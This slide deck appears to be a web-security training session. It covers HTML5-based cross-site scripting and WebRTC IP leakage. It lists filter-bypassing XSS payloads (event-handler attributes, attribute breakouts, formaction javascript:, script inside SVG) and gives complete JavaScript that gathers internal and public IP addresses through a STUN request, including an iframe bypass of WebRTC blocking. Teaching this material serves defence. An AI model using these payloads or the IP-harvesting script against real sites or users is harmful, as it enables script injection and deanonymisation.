<!-- .slide: class="center" -->
# Day 4
--

# HTML5 Tags

1. HTML5-driven cross-site scripting using tags, events and attributes
1. Exploiting svg tag
1. Exploiting webrtc


--

# Bypass tag blocks

<pre>

&lt;video onerror="javascript:alert(1)">

&lt;audio onerror="javascript:alert(1)">

&lt;input autofocus onfocus=alert(1)>

&lt;select autofocus onfocus=alert(1)>

&lt;textarea autofocus onfocus=alert(1)> 

&lt;keygen autofocus onfocus=alert(1)>

</pre>
--

￼
# Attack Vectors

1. for following input 
<pre>
￼￼&lt;input type=”text” value=”yourinput”>
</pre>
List of payload that can be tried.

<pre>

" onfocus=alert(1) autofocus x="

" onfocusin=alert(1) autofocus x=" 

" onfocusout=alert(1) autofocus x=" 

" onblur=alert(1) autofocus x="

</pre>

--


# Form

&lt;form>&lt;button formaction="javascript:alert(1)">text&lt;/button>&lt;/form>

--

# SVG 
1. Scalable Vector graphics.

<pre>
&lt;svg width="100" height="100">

&lt;circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" /> 

&lt;/svg>
</pre>

#### Example 
<hr>
<svg width="100" height="100">
<circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" /> </svg>
--
# Attacking SVG

1. Doesn't works in embedded svg
<pre>
&lt;img src="test.svg" />
</pre>
1. Works if SVG is directly opened in browser

<pre>
&lt;!DOCTYPEsvg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

&lt;svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"> 

&lt;circle cx="100" cy="50" r="40" stroke-wdith="2" fill="red"/>

&lt;script>

alert('Js in SVG executes');

&lt;/script> </svg>

</pre>
--

# WebRTC exploit

1. RTC : Real time communication.
1. Uses STUN (Session Traversal Utilities for NAT) 
1. Uses TURN (Traversal Using Relays around NAT)

--
# STUN / TURN
1. STUN : Direct connection between two nodes.
1. TURN : server mediated
1. STUN : Higher speed if users in same network
1. TURN : can traverse symmetric NATs too
1. TURN protocol runs top of STUN to setup a relay service
1. A critical disadvantage of a TURN server is its cost; and huge bandwidth usage in case when HD video stream is delivered. 

--
# Initiate WebRTC Connection
<pre>
//compatibility for firefox and chrome
var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;

var useWebKit = !!window.webkitRTCPeerConnection;

//bypass naive webrtc blocking using an iframe
if(!RTCPeerConnection){
var win = iframe.contentWindow;
RTCPeerConnection = win.RTCPeerConnection || win.mozRTCPeerConnection || win.webkitRTCPeerConnection;
useWebKit = !!win.webkitRTCPeerConnection;
}

//minimal requirements for data connection
var mediaConstraints = {optional: [{RtpDataChannels: true}]};

var servers = undefined;
//add same stun server for chrome
if(useWebKit)
servers = {iceServers: [{urls:"stun:stun.services.mozilla.com"}]};

//construct a new RTCPeerConnection
var pc = new RTCPeerConnection(servers, mediaConstraints);
</pre>

--

# Attack
1. most useful to extract internal IP Addresses using STUN and SDP (Session Description protocol)

--

# Connection via STUN

<pre>
&lt;iframe id="iframe" sandbox="allow-same-origin" style="display: none">&lt;/iframe>
&lt;script>
//get the IP addresses associated with an account
function getIPs(callback){
var ip_dups = {};
<b>&lt;INITIATE RTC Connection &gt;</b>
function handleCandidate(candidate){
//match just the IP address
var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/
var ip_addr = ip_regex.exec(candidate)[1];
//remove duplicates
if(ip_dups[ip_addr] === undefined)
  callback(ip_addr);
ip_dups[ip_addr] = true;
}
//listen for candidate events
pc.onicecandidate = function(ice){
//skip non-candidate events
if(ice.candidate) 
   handleCandidate(ice.candidate.candidate);
};
</pre>

--

# Connection via STUN
<pre>
//create a bogus data channel
pc.createDataChannel("");
//create an offer sdp
pc.createOffer(function(result){
//trigger the stun server request
pc.setLocalDescription(result, function(){}, function(){});
}, function(){});
//wait for a while to let everything done
setTimeout(function(){
//read candidate info from local description
var lines = pc.localDescription.sdp.split('\n');
lines.forEach(function(line){
if(line.indexOf('a=candidate:') === 0)
handleCandidate(line);
});
}, 1000);
}
</pre>

--
# Extract IP

<pre>
//insert IP addresses into the page
getIPs(function(ip){
var li = document.createElement("li");
li.textContent = ip;
//local IPs
if (ip.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/))
  document.getElementsByTagName("ul")[0].appendChild(li);
//assume the rest are public IPs
else
  document.getElementsByTagName("ul")[1].appendChild(li);
});
&lt;script>
</pre>